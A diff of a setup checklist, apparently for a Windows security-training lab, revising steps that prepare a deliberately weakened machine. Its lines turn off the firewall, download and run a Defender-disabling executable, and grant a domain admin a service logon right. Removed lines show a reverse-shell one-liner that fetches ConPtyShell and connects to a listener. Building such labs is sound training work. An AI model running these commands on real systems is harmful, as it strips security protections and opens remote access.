@@ -1,25 +1,18 @@
-# download sysinternals, run edge + notepad
-
-# set uac
-```
-set uac to default
-```
-
-# disable firewall
+1. set uac to default
+2. restart pc
+3. disable firewall
 ```
 netsh advfirewall set allprofiles state off
 ```
-
-# disable antivirus
+4. disable antivirus - disable all antivirus in settings and then
 ```
-login as Administrator, and disable all antivirus in settings and then
-cd Desktop
-wget https://github.com/pgkt04/defender-control/releases/download/v1.5/disable-defender.exe -o uwu.exe
-.\uwu.exe
+wget https://github.com/pgkt04/defender-control/releases/download/v1.5/disable-defender.exe -o uwu.exe; .\uwu.exe;
 ```
-
-# optional raw colorful shell
-```bash
-stty raw -echo; (stty size; cat) | nc -lvnp 1337
-IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.5.30.50 1337
+5. run edge (for Credentialkatz scenario)
+6. install Packetbeat
 ```
+cd C:\Users\localuser\Desktop; .\install_packetbeat.ps1
+```
+7. move Secret Goulash Recipe to "C:\Users\domainuser\Documents"
+8. Add "ludus\domainadmin" to Local Security Policy > Security Settings > Local Policies > User Rights Assignment > "Log on as a service"
+9. install unquoted.ps1 on domainmember
